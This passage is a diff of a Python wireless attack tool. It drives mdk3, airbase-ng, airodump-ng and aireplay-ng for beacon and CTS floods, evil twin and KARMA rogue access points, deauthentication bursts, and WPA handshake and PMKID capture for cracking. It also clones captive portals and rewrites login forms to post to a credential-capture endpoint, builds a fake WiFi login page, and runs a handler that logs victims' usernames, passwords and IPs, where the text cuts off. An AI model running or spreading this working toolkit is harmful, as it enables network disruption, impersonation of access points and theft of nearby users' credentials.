+        cmd = ['sudo', mdk3, mon, 'a', '-a', target['bssid']]
+        print("Press Ctrl+C to stop\n")
+        try:
+            subprocess.run(cmd)
+        except KeyboardInterrupt:
+            print("\nStopped.")
 
-    def captive_portal_attack(self):
-        """Execute captive portal attack with cloning options"""
-        print("\n" + "="*60)
-        print("CAPTIVE PORTAL ATTACK")
-        print("="*60)
-        print("1. Use default captive portal")
-        print("2. Clone target network captive portal")
-        print("3. Back to main menu")
-        print("-"*60)
-
-        choice = input("\nSelect option (1-3): ").strip()
-
-        if choice == '1':
-            self.default_captive_portal()
-        elif choice == '2':
-            self.clone_captive_portal()
-        elif choice == '3':
+    def _attack_beacon_flood(self, target: dict, params: dict):
+        mon = self.iface_mgr.monitor_interface
+        mdk3 = self._require_tool('mdk3')
+        if not mdk3:
             return
+
+        count = input("Number of fake APs (default 50): ").strip() or '50'
+        print(f"\nBEACON FLOOD ATTACK")
+        cmd = ['sudo', mdk3, mon, 'b', '-n', count, '-s', '1000']
+        print("Press Ctrl+C to stop\n")
+        try:
+            subprocess.run(cmd)
+        except KeyboardInterrupt:
+            print("\nStopped.")
+
+    def _attack_cts_flood(self, target: dict, params: dict):
+        mon = self.iface_mgr.monitor_interface
+        mdk3 = self._require_tool('mdk3')
+        if not mdk3:
+            return
+
+        channel = target.get('channel', '6').strip()
+        print(f"\nCTS FRAME FLOOD → Channel {channel}")
+        cmd = ['sudo', mdk3, mon, 'c', '-c', channel]
+        print("Press Ctrl+C to stop\n")
+        try:
+            subprocess.run(cmd)
+        except KeyboardInterrupt:
+            print("\nStopped.")
+
+    def _attack_evil_twin(self, target: dict, params: dict):
+        iface   = self.iface_mgr.attack_interface
+        airbase = self._require_tool('airbase-ng')
+        if not airbase:
+            return
+
+        print(f"\nEVIL TWIN → Cloning {target['essid']}")
+        print(f"TX iface : {iface}"
+              + (" [dedicated attack interface]" if self.iface_mgr.dual_interface else ""))
+        cmd = [
+            'sudo', airbase,
+            '-e', target['essid'],
+            '-c', target['channel'].strip(),
+            '-a', target['bssid'],
+            iface,
+        ]
+        print("Press Ctrl+C to stop\n")
+        try:
+            proc = subprocess.Popen(cmd)
+            self.registry.register('evil_twin', proc)
+            proc.wait()
+        except KeyboardInterrupt:
+            print("\nStopped.")
+        finally:
+            self.registry.terminate('evil_twin')
+
+    def _attack_karma(self, target: dict, params: dict):
+        iface   = self.iface_mgr.attack_interface
+        airbase = self._require_tool('airbase-ng')
+        if not airbase:
+            return
+
+        essid   = input("Fake AP ESSID (default: FreeWiFi): ").strip() or 'FreeWiFi'
+        channel = input("Channel 1-13 (default 6): ").strip() or '6'
+        print(f"\nKARMA ATTACK → ESSID: {essid}")
+        print(f"TX iface : {iface}"
+              + (" [dedicated attack interface]" if self.iface_mgr.dual_interface else ""))
+        cmd = ['sudo', airbase, '-e', essid, '-c', channel, '-P', iface]
+        print("Press Ctrl+C to stop\n")
+        try:
+            proc = subprocess.Popen(cmd)
+            self.registry.register('karma', proc)
+            proc.wait()
+        except KeyboardInterrupt:
+            print("\nStopped.")
+        finally:
+            self.registry.terminate('karma')
+
+    def _attack_pmkid_capture(self, target: dict, params: dict):
+        cap_iface = self.iface_mgr.capture_interface
+        airodump  = self._require_tool('airodump-ng')
+        if not airodump:
+            return
+
+        out = str(self.temp_dir / f"pmkid_{target['bssid'].replace(':', '')}")
+        print(f"\nPMKID CAPTURE → {target['essid']}")
+        print(f"RX iface : {cap_iface}")
+        cmd = [
+            'sudo', airodump,
+            '-c', target['channel'].strip(),
+            '--bssid', target['bssid'],
+            '-w', out, cap_iface,
+        ]
+        print("Press Ctrl+C when capture is complete\n")
+        try:
+            subprocess.run(cmd)
+        except KeyboardInterrupt:
+            print(f"\nCapture saved to: {out}")
+
+    def _attack_wpa_handshake(self, target: dict, params: dict):
+        cap_iface = self.iface_mgr.capture_interface
+        airodump  = self._require_tool('airodump-ng')
+        if not airodump:
+            return
+
+        out = str(self.temp_dir / f"handshake_{target['bssid'].replace(':', '')}")
+        print(f"\nWPA HANDSHAKE CAPTURE → {target['essid']}")
+        print(f"RX iface : {cap_iface}")
+        if self.iface_mgr.dual_interface:
+            print(f"TX iface : {self.iface_mgr.attack_interface}"
+                  "  [deauth on dedicated interface - capture uninterrupted]")
+        print("1. Passive capture")
+        print("2. Active (deauth + capture)")
+        mode = input("Select (default 1): ").strip() or '1'
+
+        self._set_target_channel(target)
+        cmd = [
+            'sudo', airodump,
+            '-c', target['channel'].strip(),
+            '--bssid', target['bssid'],
+            '-w', out, cap_iface,
+        ]
+
+        if mode == '2':
+            if self.iface_mgr.dual_interface:
+                # Capture and deauth truly concurrent - no interruption
+                print("\nStarting capture + deauth concurrently...")
+                proc = subprocess.Popen(
+                    cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+                )
+                self.registry.register('handshake_capture', proc)
+                time.sleep(3)
+
+                def deauth_loop():
+                    for burst in range(3):
+                        print(f" [*] Deauth burst {burst + 1}/3"
+                              f" [{self.iface_mgr.attack_interface}]")
+                        self._send_deauth(target, count='10')
+                        time.sleep(3)
+
+                dt = threading.Thread(target=deauth_loop, daemon=True)
+                dt.start()
+                print("Press Ctrl+C when handshake captured.\n")
+                try:
+                    proc.wait()
+                except KeyboardInterrupt:
+                    pass
+                finally:
+                    self.registry.terminate('handshake_capture')
+                    dt.join(timeout=5)
+            else:
+                # Single interface: start capture, pause briefly to deauth
+                print("\nStarting capture, deauth in 5s...")
+                proc = subprocess.Popen(
+                    cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+                )
+                self.registry.register('handshake_capture', proc)
+                time.sleep(5)
+                self._send_deauth(target, count='5')
+                print("Deauth sent. Press Ctrl+C when handshake captured.\n")
+                try:
+                    proc.wait()
+                except KeyboardInterrupt:
+                    pass
+                finally:
+                    self.registry.terminate('handshake_capture')
         else:
-            print("Invalid selection.")
-
-    def find_strongest_ap_for_ssid(self, target_ssid):
-        """Find the AP with strongest signal for a given SSID"""
-        # Filter networks matching the target SSID
-        matching_aps = [net for net in self.discovered_networks
-                        if net['essid'] == target_ssid]
-
-        if not matching_aps:
-            return None
-
-        # Convert power to int for comparison (remove any non-numeric chars)
-        for ap in matching_aps:
+            print("Press Ctrl+C when handshake captured.\n")
             try:
-                # Power is like "-46", convert to int
-                ap['power_int'] = int(ap['power'].strip())
-            except:
-                ap['power_int'] = -100  # Default to very weak if can't parse
+                subprocess.run(cmd)
+            except KeyboardInterrupt:
+                pass
 
-        # Sort by power (higher/closer to 0 is stronger)
-        # -46 > -74, so we want max()
-        strongest = max(matching_aps, key=lambda x: x['power_int'])
+        print(f"\nCapture : {out}-01.cap")
+        print(f"Crack   : aircrack-ng -w /path/to/wordlist {out}-01.cap")
 
-        print(f"\nFound {len(matching_aps)} APs with SSID '{target_ssid}'")
-        print(f"Selecting strongest: {strongest['bssid']} (Power: {strongest['power']} dBm)")
-
-        return strongest
-
-    def clone_captive_portal(self):
-        """Clone target network's captive portal"""
-        if not self.target_network:
-            print("No target selected.")
+    def _send_deauth(self, target: dict, count: str = '5', client_mac: str | None = None):
+        """
+        Send deauth frames using the attack interface.
+        Uses secondary interface when available so the capture interface
+        is never interrupted mid-listen.
+        """
+        aireplay = self.tool_paths.get('aireplay-ng')
+        if not aireplay:
             return
+        iface = self.iface_mgr.attack_interface
+        if not iface:
+            return
+        cmd = ['sudo', aireplay, '--deauth', count, '-a', target['bssid']]
+        if client_mac:
+            cmd += ['-c', client_mac]
+        cmd.append(iface)
+        try:
+            subprocess.run(cmd, timeout=15,
+                           stdout=subprocess.DEVNULL,
+                           stderr=subprocess.DEVNULL)
+        except Exception:
+            pass
 
-        # Find strongest AP for this SSID
-        target_ssid = self.target_network['essid']
-        strongest_ap = self.find_strongest_ap_for_ssid(target_ssid)
+    # ------------------------------------------------------------------
+    # Combo attacks
+    # ------------------------------------------------------------------
 
-        if strongest_ap:
-            # Use strongest AP instead of originally selected target
-            connection_target = strongest_ap
-            print(f"\nUsing strongest AP for connection:")
-            print(f"  BSSID: {strongest_ap['bssid']}")
-            print(f"  Channel: {strongest_ap['channel']}")
-            print(f"  Power: {strongest_ap['power']} dBm")
-        else:
-            # Fallback to original target
-            connection_target = self.target_network
-
-        # Verify target is open network
-        if connection_target['privacy'].upper() not in ['OPN', 'OPEN', '']:
-            print(f"\nWarning: Target network appears to be {connection_target['privacy']}")
-            print("This attack works best on open (OPN) networks with captive portals.")
-            proceed = input("Continue anyway? (y/n): ").strip().lower()
-            if proceed != 'y':
-                return
-
-        portal_dir = Path(f"./captive_portals/{target_ssid.replace(' ', '_')}")
-        portal_dir.mkdir(parents=True, exist_ok=True)
+    def _combo_deauth_handshake(self, target: dict, params: dict):
+        """
+        Concurrent: dedicated capture interface listens for the handshake
+        while the attack interface sends deauth bursts.
+        In single-interface mode falls back to sequential (capture then deauth).
+        """
+        cap_iface = self.iface_mgr.capture_interface
+        atk_iface = self.iface_mgr.attack_interface
+        airodump  = self._require_tool('airodump-ng')
+        aireplay  = self._require_tool('aireplay-ng')
+        if not airodump or not aireplay:
+            return
 
         print(f"\n{'='*60}")
-        print(f"CLONING CAPTIVE PORTAL: {target_ssid}")
+        print(f" COMBO: DEAUTH + HANDSHAKE CAPTURE")
+        print(f" Target   : {target['essid']} ({target['bssid']})")
+        print(f" Channel  : {target['channel'].strip()}")
+        if self.iface_mgr.dual_interface:
+            print(f" Capture  : {cap_iface}  [dedicated - uninterrupted]")
+            print(f" Attack   : {atk_iface}  [dedicated - tx only]")
+        else:
+            print(f" Interface: {cap_iface}  [single - shared mode]")
         print(f"{'='*60}")
 
-        # Step 1: Connect to target network using strongest AP
-        print(f"\n[1/6] Connecting to target network...")
-        if not self.connect_to_network(target_ssid):
-            print("Failed to connect to target network.")
+        self._set_target_channel(target)
+
+        out = str(self.temp_dir / f"combo_hs_{target['bssid'].replace(':', '')}")
+        cap_cmd = [
+            'sudo', airodump,
+            '-c', target['channel'].strip(),
+            '--bssid', target['bssid'],
+            '-w', out,
+            cap_iface,
+        ]
+
+        cap_proc = subprocess.Popen(
+            cap_cmd,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+        self.registry.register('combo_capture', cap_proc)
+        time.sleep(3)
+        print(" [*] Capture running...")
+
+        if self.iface_mgr.dual_interface:
+            # True concurrent mode: deauth thread runs while capture
+            # continues uninterrupted on the separate interface
+            def deauth_loop():
+                for burst in range(3):
+                    print(f" [*] Deauth burst {burst + 1}/3  [{atk_iface}]")
+                    self._send_deauth(target, count='10')
+                    time.sleep(3)
+                print(" [*] Deauth complete - still capturing...")
+
+            dt = threading.Thread(target=deauth_loop, daemon=True)
+            dt.start()
+            print(" [*] Press Ctrl+C when WPA handshake is captured\n")
+            try:
+                cap_proc.wait()
+            except KeyboardInterrupt:
+                pass
+            finally:
+                self.registry.terminate('combo_capture')
+                dt.join(timeout=5)
+        else:
+            # Single interface: brief deauth burst then back to capture
+            print(" [*] Sending deauth burst (single interface - brief interruption)...")
+            time.sleep(2)
+            self._send_deauth(target, count='10')
+            print(" [*] Deauth sent - capture resuming...")
+            print(" [*] Press Ctrl+C when WPA handshake is captured\n")
+            try:
+                cap_proc.wait()
+            except KeyboardInterrupt:
+                pass
+            finally:
+                self.registry.terminate('combo_capture')
+
+        print(f"\n Capture : {out}-01.cap")
+        print(f" Crack   : aircrack-ng -w wordlist {out}-01.cap")
+
+    def _combo_evil_twin_portal(self, target: dict, params: dict):
+        """
+        Evil twin AP on the attack interface + continuous deauth on the
+        capture interface to drive clients off the real AP.
+        In single-interface mode runs the AP only (no simultaneous deauth).
+        """
+        print(f"\n{'='*60}")
+        print(f" COMBO: EVIL TWIN + CAPTIVE PORTAL")
+        print(f" Target: {target['essid']} ({target['bssid']})")
+        if self.iface_mgr.dual_interface:
+            print(f" AP     : {self.iface_mgr.attack_interface}  [rogue AP]")
+            print(f" Deauth : {self.iface_mgr.capture_interface}  [continuous deauth]")
+        else:
+            print(" Mode   : single interface (no simultaneous deauth)")
+        print(f"{'='*60}")
+
+        portal_dir = self.temp_dir / f"portal_{target['essid'].replace(' ', '_')}"
+        portal_dir.mkdir(parents=True, exist_ok=True)
+        self._create_default_portal(portal_dir, target['essid'])
+
+        if self.iface_mgr.dual_interface:
+            # Start deauth loop in background thread on capture interface
+            # while the portal runs on the attack interface
+            stop_deauth = threading.Event()
+
+            def deauth_loop():
+                while not stop_deauth.is_set():
+                    self._send_deauth(target, count='5')
+                    stop_deauth.wait(timeout=5)
+
+            dt = threading.Thread(target=deauth_loop, daemon=True)
+            dt.start()
+            print(" [*] Continuous deauth running on"
+                  f" {self.iface_mgr.capture_interface}...")
+            try:
+                self._launch_rogue_ap_with_portal(
+                    target, portal_dir, 'default_portal'
+                )
+            finally:
+                stop_deauth.set()
+                dt.join(timeout=5)
+        else:
+            self._launch_rogue_ap_with_portal(
+                target, portal_dir, 'default_portal'
+            )
+
+    # ------------------------------------------------------------------
+    # Captive portal attacks
+    # ------------------------------------------------------------------
+
+    def _attack_captive_portal_default(self, target: dict, params: dict):
+        ssid = target['essid']
+        portal_dir = self.temp_dir / f"portal_default_{ssid.replace(' ', '_')}"
+        portal_dir.mkdir(parents=True, exist_ok=True)
+        self._create_default_portal(portal_dir, ssid)
+        self._launch_rogue_ap_with_portal(target, portal_dir, 'default_portal')
+
+    def _attack_captive_portal_clone(self, target: dict, params: dict):
+        ssid       = target['essid']
+        portal_dir = self.temp_dir / f"portal_clone_{ssid.replace(' ', '_')}"
+        portal_dir.mkdir(parents=True, exist_ok=True)
+
+        # Find strongest AP for this SSID
+        networks, _ = self.scan_engine.get_snapshot() if self.scan_engine else ([], {})
+        matching = [n for n in networks if n['essid'] == ssid]
+        if matching:
+            connection_target = max(matching, key=lambda x: x.get('avg_power', -100))
+        else:
+            connection_target = target
+
+        privacy = connection_target.get('privacy', '').upper()
+        if privacy not in ('OPN', 'OPEN', ''):
+            print(f"\nWarning: Network is {privacy} - captive portal clone works best on open networks.")
+            if input("Continue? (y/n): ").strip().lower() != 'y':
+                return
+
+        print(f"\n[1/5] Connecting to {ssid} via {connection_target['bssid']}...")
+        phys = self.iface_mgr.physical_interface
+        if not phys or not self.iface_mgr.connect_to_network(phys, ssid):
+            print("Failed to connect.")
             return
 
-        # Rest of the method stays the same...
-        # Step 2: Detect captive portal URL
-        print(f"\n[2/6] Detecting captive portal URL...")
-        portal_url = self.detect_captive_portal()
-        if not portal_url:
-            print("Could not detect captive portal. Using default URL.")
-            portal_url = "http://192.168.1.1"
-
+        print("[2/5] Detecting captive portal URL...")
+        portal_url = self._detect_captive_portal() or f"http://192.168.1.1"
         print(f"Portal URL: {portal_url}")
 
-        # Step 3: Clone portal with httrack
-        print(f"\n[3/6] Cloning portal with httrack...")
-        if not self.clone_portal_wget(portal_url, portal_dir):
-            print("Failed to clone portal.")
-            self.disconnect_from_network()
+        print("[3/5] Cloning portal with wget...")
+        if not self._clone_portal_wget(portal_url, portal_dir):
+            print("Clone failed.")
+            self.iface_mgr.disconnect_from_network(phys)
             return
 
-        # Step 4: Modify cloned portal forms
-        print(f"\n[4/6] Modifying portal forms to capture credentials...")
-        self.modify_portal_forms(portal_dir)
+        print("[4/5] Modifying forms...")
+        self._modify_portal_forms(portal_dir)
 
-        # Step 5: Disconnect from target network
-        print(f"\n[5/6] Disconnecting from target network...")
-        self.disconnect_from_network()
+        print("[5/5] Disconnecting from target...")
+        self.iface_mgr.disconnect_from_network(phys)
 
-        # Step 6: Launch rogue AP with cloned portal
-        print(f"\n[6/6] Launching rogue AP with cloned portal...")
-        print(f"\nPortal files stored in: {portal_dir}")
-        print("\nStarting infrastructure:")
-        print("  - Rogue AP (airbase-ng)")
-        print("  - DHCP server (dnsmasq)")
-        print("  - DNS redirect")
-        print("  - Web server (Python)")
-        print("\nPress Ctrl+C to stop all services\n")
+        input("\nPress Enter to launch rogue AP, Ctrl+C to cancel...")
+        self._launch_rogue_ap_with_portal(target, portal_dir, 'cloned')
 
-        input("Press Enter to start, or Ctrl+C to cancel...")
-
-        self.launch_rogue_ap_with_portal(portal_dir)
-
-    def connect_to_network(self, ssid, bssid=None):
-        """Connect attacking interface to target network using NetworkManager"""
-        try:
-            print(f"Connecting to {ssid}...")
-
-            # Simple nmcli connection - that's it!
-            result = subprocess.run(['sudo', 'nmcli', 'device', 'wifi', 'connect', ssid,
-                                'ifname', self.selected_interface],
-                                capture_output=True, text=True, timeout=30)
-
-            if result.returncode != 0:
-                print(f"Connection failed: {result.stderr}")
-                return False
-
-            print(f"Connected to {ssid}")
-            time.sleep(2)
-
-            # Verify we got an IP
-            check = subprocess.run(['ip', 'addr', 'show', self.selected_interface],
-                                capture_output=True, text=True)
-
-            if 'inet ' in check.stdout:
-                ip_match = re.search(r'inet ([\d.]+)', check.stdout)
-                if ip_match:
-                    print(f"IP Address: {ip_match.group(1)}")
-                return True
-
-            return False
-
-        except subprocess.TimeoutExpired:
-            print("Connection timeout")
-            return False
-        except Exception as e:
-            print(f"Connection error: {e}")
-            return False
-
-    def disconnect_from_network(self):
-        """Disconnect from current network using NetworkManager"""
-        try:
-            print("Disconnecting from network...")
-            subprocess.run(['sudo', 'nmcli', 'device', 'disconnect', self.selected_interface],
-                        capture_output=True, timeout=10)
-            time.sleep(1)
-            print("Disconnected")
-            return True
-        except Exception as e:
-            print(f"Disconnect error: {e}")
-            return False
-
-    def detect_captive_portal(self):
-        """Detect captive portal URL by attempting common detection methods"""
-        import socket
-
-        # Common captive portal detection URLs
+    def _detect_captive_portal(self) -> str | None:
+        import urllib.request
         detection_urls = [
             'http://captive.apple.com',
             'http://connectivitycheck.gstatic.com/generate_204',
-            'http://www.msftconnecttest.com/connecttest.txt'
+            'http://www.msftconnecttest.com/connecttest.txt',
         ]
+        for url in detection_urls:
+            try:
+                resp = urllib.request.urlopen(url, timeout=5)
+                if resp.geturl() != url:
+                    return resp.geturl()
+            except Exception:
+                continue
 
-        try:
-            import urllib.request
-            for url in detection_urls:
-                try:
-                    response = urllib.request.urlopen(url, timeout=5)
-                    # If we get redirected, that's likely the captive portal
-                    if response.geturl() != url:
-                        return response.geturl()
-                except:
-                    continue
-
-            # Fallback: try to get default gateway
-            result = subprocess.run(['ip', 'route', 'show', 'default'],
-                                capture_output=True, text=True)
-            if result.stdout:
-                # Extract gateway IP
-                match = re.search(r'default via ([\d.]+)', result.stdout)
-                if match:
-                    gateway = match.group(1)
-                    return f"http://{gateway}"
-        except:
-            pass
-
+        result = subprocess.run(
+            ['ip', 'route', 'show', 'default'],
+            capture_output=True, text=True
+        )
+        m = re.search(r'default via ([\d.]+)', result.stdout)
+        if m:
+            return f"http://{m.group(1)}"
         return None
-    def clone_portal_wget(self, url, output_dir):
-        """Clone captive portal using wget"""
-        try:
-            clone_path = output_dir / 'cloned'
-            clone_path.mkdir(exist_ok=True)
 
-            print(f"Cloning portal: {url}")
-
-            cmd = [
-                'wget',
-                '--recursive',
-                '--level=3',
-                '--page-requisites',
-                '--adjust-extension',
-                '--convert-links',
-                '--no-parent',
-                '--no-host-directories',
-                '--directory-prefix', str(clone_path),
-                '--timeout=20',
-                '--tries=2',
-                url
-            ]
-
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
-
-            html_files = list(clone_path.glob('**/*.html'))
-            if html_files:
-                print(f"Cloned {len(html_files)} pages with assets")
-                return True
-
-            return False
-
-        except Exception as e:
-            print(f"Clone error: {e}")
-            return False
-
-    def modify_portal_forms(self, portal_dir):
-        """Modify HTML forms in cloned portal to capture credentials"""
-        import re
-        from bs4 import BeautifulSoup
-
+    def _clone_portal_wget(self, url: str, portal_dir: Path) -> bool:
         clone_path = portal_dir / 'cloned'
+        clone_path.mkdir(exist_ok=True)
+        cmd = [
+            'wget', '--recursive', '--level=3', '--page-requisites',
+            '--adjust-extension', '--convert-links', '--no-parent',
+            '--no-host-directories',
+            '--directory-prefix', str(clone_path),
+            '--timeout=20', '--tries=2', url
+        ]
+        try:
+            subprocess.run(cmd, capture_output=True, timeout=60)
+            return bool(list(clone_path.glob('**/*.html')))
+        except Exception:
+            return False
 
-        # Get all HTML files, but filter out directories and special HTTrack files
-        html_files = []
-        for pattern in ['**/*.html', '**/*.htm']:
-            for file_path in clone_path.glob(pattern):
-                # Skip if it's a directory or special HTTrack index files
-                if file_path.is_file() and file_path.name not in ['*.html', '*.htm', 'index.html~']:
-                    html_files.append(file_path)
-
-        if not html_files:
-            print("No valid HTML files found to modify")
-            return
-
-        modified_count = 0
-
+    def _modify_portal_forms(self, portal_dir: Path):
+        clone_path = portal_dir / 'cloned'
+        html_files = [
+            f for f in clone_path.glob('**/*.html')
+            if f.is_file()
+        ]
+        modified = 0
         for html_file in html_files:
             try:
                 with open(html_file, 'r', encoding='utf-8', errors='ignore') as f:
                     soup = BeautifulSoup(f.read(), 'html.parser')
-
-                # Find all forms
-                forms = soup.find_all('form')
-
-                for form in forms:
-                    # Look for login forms (forms with password fields)
+                for form in soup.find_all('form'):
                     inputs = form.find_all('input')
-                    has_password = any(inp.get('type') == 'password' for inp in inputs)
-                    has_text_or_email = any(inp.get('type') in ['text', 'email', None] for inp in inputs)
-
-                    if has_password and has_text_or_email:
-                        # Modify form to POST to our capture endpoint
+                    has_pw   = any(i.get('type') == 'password' for i in inputs)
+                    has_text = any(i.get('type') in ('text', 'email', None) for i in inputs)
+                    if has_pw and has_text:
                         form['action'] = '/capture_credentials'
                         form['method'] = 'post'
-
-                        modified_count += 1
-
-                # Write modified HTML
+                        modified += 1
                 with open(html_file, 'w', encoding='utf-8') as f:
                     f.write(str(soup))
-
-            except Exception as e:
-                print(f"Error modifying {html_file.name}: {e}")
+            except Exception:
                 continue
+        print(f"Modified {modified} form(s) across {len(html_files)} HTML file(s).")
 
-        print(f"Modified {modified_count} forms across {len(html_files)} files")
+    def _create_default_portal(self, portal_dir: Path, ssid: str) -> Path:
+        portal_html_dir = portal_dir / 'default_portal'
+        portal_html_dir.mkdir(parents=True, exist_ok=True)
 
-    def launch_rogue_ap_with_portal(self, portal_dir, portal_subdir='cloned'):
-        """Launch rogue AP with captive portal infrastructure"""
-        import http.server
-        import socketserver
-        from threading import Thread
+        html = f'''<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WiFi Login - {ssid}</title>
+    <style>
+        * {{ margin:0; padding:0; box-sizing:border-box; }}
+        body {{
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg,#667eea 0%,#764ba2 100%);
+            min-height:100vh; display:flex; align-items:center;
+            justify-content:center; padding:20px;
+        }}
+        .container {{
+            background:white; border-radius:12px;
+            box-shadow:0 20px 60px rgba(0,0,0,.3);
+            max-width:400px; width:100%; padding:40px;
+        }}
+        .wifi-icon {{
+            width:80px; height:80px; margin:0 auto 20px;
+            background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);
+            border-radius:50%; display:flex; align-items:center;
+            justify-content:center; font-size:40px; color:white;
+        }}
+        h1 {{ color:#333; font-size:24px; text-align:center; margin-bottom:10px; }}
+        .network-name {{ text-align:center; color:#667eea; font-weight:600; font-size:18px; margin-bottom:30px; }}
+        .welcome-text {{ text-align:center; color:#666; margin-bottom:30px; line-height:1.5; }}
+        .form-group {{ margin-bottom:20px; }}
+        label {{ display:block; color:#333; font-weight:500; margin-bottom:8px; font-size:14px; }}
+        input {{
+            width:100%; padding:12px 15px; border:2px solid #e0e0e0;
+            border-radius:6px; font-size:15px; transition:border-color .3s;
+        }}
+        input:focus {{ outline:none; border-color:#667eea; }}
+        button {{
+            width:100%; padding:14px;
+            background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);
+            color:white; border:none; border-radius:6px;
+            font-size:16px; font-weight:600; cursor:pointer;
+        }}
+        .terms {{ text-align:center; margin-top:20px; font-size:12px; color:#999; }}
+        .terms a {{ color:#667eea; text-decoration:none; }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div style="text-align:center">
+            <div class="wifi-icon">&#x1F4F6;</div>
+            <h1>WiFi Access</h1>
+            <div class="network-name">{ssid}</div>
+        </div>
+        <div class="welcome-text">Welcome! Please sign in to access the internet.</div>
+        <form action="/capture_credentials" method="post">
+            <div class="form-group">
+                <label for="username">Email or Username</label>
+                <input type="text" id="username" name="username" required placeholder="Enter your email">
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required placeholder="Enter your password">
+            </div>
+            <button type="submit">Connect to WiFi</button>
+        </form>
+        <div class="terms">By connecting you agree to our <a href="#">Terms of Service</a></div>
+    </div>
+</body>
+</html>'''
 
-        if not self.target_network:
-            print("No target network selected")
+        (portal_html_dir / 'index.html').write_text(html, encoding='utf-8')
+        print(f"Default portal created: {portal_html_dir}")
+        return portal_html_dir
+
+    def _launch_rogue_ap_with_portal(self, target: dict, portal_dir: Path, subdir: str):
+        """Launch airbase-ng + dnsmasq + Python web server for captive portal."""
+        mon      = self.iface_mgr.monitor_interface
+        airbase  = self._require_tool('airbase-ng')
+        dnsmasq  = self._require_tool('dnsmasq')
+        if not airbase or not dnsmasq:
             return
 
-        # Check if port 80 is in use
-        port_check = subprocess.run(['sudo', 'lsof', '-i', ':80'],
-                                    capture_output=True, text=True)
-        if port_check.stdout:
-            print("\nPort 80 is already in use:")
-            print(port_check.stdout)
-            print("\nAttempting to free port 80...")
+        # Free port 80 and 53
+        for svc in ('apache2', 'nginx', 'lighttpd', 'httpd'):
+            subprocess.run(['sudo', 'systemctl', 'stop', svc], capture_output=True)
+        subprocess.run(['sudo', 'systemctl', 'stop', 'systemd-resolved'], capture_output=True)
+        subprocess.run(['sudo', 'pkill', 'dnsmasq'], capture_output=True)
+        time.sleep(1)
 
-            # Common services that use port 80
-            for service in ['apache2', 'nginx', 'lighttpd', 'httpd']:
-                subprocess.run(['sudo', 'systemctl', 'stop', service],
-                            capture_output=True)
-
-            time.sleep(2)
-
-        # Check if port 53 (DNS) is in use
-        dns_check = subprocess.run(['sudo', 'lsof', '-i', ':53'],
-                                capture_output=True, text=True)
-        if dns_check.stdout:
-            print("\nPort 53 (DNS) is already in use:")
-            print(dns_check.stdout)
-            print("\nStopping conflicting DNS services...")
-
-            # Stop systemd-resolved or other DNS services
-            subprocess.run(['sudo', 'systemctl', 'stop', 'systemd-resolved'],
-                        capture_output=True)
-            subprocess.run(['sudo', 'pkill', 'dnsmasq'], capture_output=True)
-
-            time.sleep(2)
-
-        clone_path = portal_dir / portal_subdir
-
-        # Find the main index file
+        clone_path = portal_dir / subdir
+        # Locate index file
         index_file = None
-        for name in ['index.html', 'index.htm', 'login.html', 'portal.html']:
-            potential = list(clone_path.glob(f'**/{name}'))
-            if potential:
-                index_file = potential[0]
+        for name in ('index.html', 'index.htm', 'login.html', 'portal.html'):
+            candidates = list(clone_path.glob(f'**/{name}'))
+            if candidates:
+                index_file = candidates[0]
                 break
-
         if not index_file:
-            # Just use first HTML file found
             html_files = [f for f in clone_path.glob('**/*.html') if f.is_file()]
-            if html_files:
-                index_file = html_files[0]
-            else:
-                print("No HTML files found in cloned portal")
-                return
+            index_file = html_files[0] if html_files else None
+        if not index_file:
+            print("No HTML files found. Cannot launch portal.")
+            return
 
-        web_root = index_file.parent
+        web_root   = index_file.parent
+        creds_file = self.temp_dir / f"creds_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+        target_ssid = target['essid']
 
-        # Create credential log file
-        creds_file = portal_dir / f'captive_portal_creds_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
-
-        # Custom HTTP handler for credential capture
         class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
             def __init__(self, *args, **kwargs):
                 super().__init__(*args, directory=str(web_root), **kwargs)
 
             def do_POST(self):
                 if self.path == '/capture_credentials':
-                    content_length = int(self.headers['Content-Length'])
-                    post_data = self.rfile.read(content_length).decode('utf-8')
-
-                    # Parse credentials
-                    from urllib.parse import parse_qs
-                    params = parse_qs(post_data)
-
-                    # Extract username/password
+                    length   = int(self.headers.get('Content-Length', 0))
+                    raw      = self.rfile.read(length).decode('utf-8')
+                    params   = parse_qs(raw)
                     username = ''
                     password = ''
+                    for k, v in params.items():
+                        kl = k.lower()
+                        if any(x in kl for x in ('user', 'email', 'login', 'id')):
+                            username = v[0] if v else ''
+                        elif any(x in kl for x in ('pass', 'pwd')):
+                            password = v[0] if v else ''
 
-                    for key, value in params.items():
-                        key_lower = key.lower()
-                        if any(x in key_lower for x in ['user', 'email', 'login', 'id']):
-                            username = value[0] if value else ''
-                        elif any(x in key_lower for x in ['pass', 'pwd']):
-                            password = value[0] if value else ''
+                    entry = (
+                        f"\n{'='*70}\n"
+                        f"Timestamp:  {datetime.now()}\n"
+                        f"SSID:       {target_ssid}\n"
+                        f"Client IP:  {self.client_address[0]}\n"
+                        f"User-Agent: {self.headers.get('User-Agent','Unknown')}\n"
+                        f"Username:   {username}\n"
+                        f"Password:   {password}\n"
+                        f"{'='*70}\n"
+                    )
+                    with open(creds_file, 'a') as fh:
+                        fh.write(entry)
+                    print(f"\n[CAPTURED] {username}:{password} from {self.client_address[0]}")
 
-                    # Log credentials
-                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                    client_ip = self.client_address[0]
-                    user_agent = self.headers.get('User-Agent', 'Unknown')
-
-                    log_entry = f"""
-    {'='*70}
-    Timestamp: {timestamp}
-    SSID: {self.server.target_ssid}
-    Client IP: {client_ip}
-    User-Agent: {user_agent}
-    Username: {username}
-    Password: {password}
-    {'='*70}
-    """
-
-                    with open(self.server.creds_file, 'a') as f:
-                        f.write(log_entry)
-
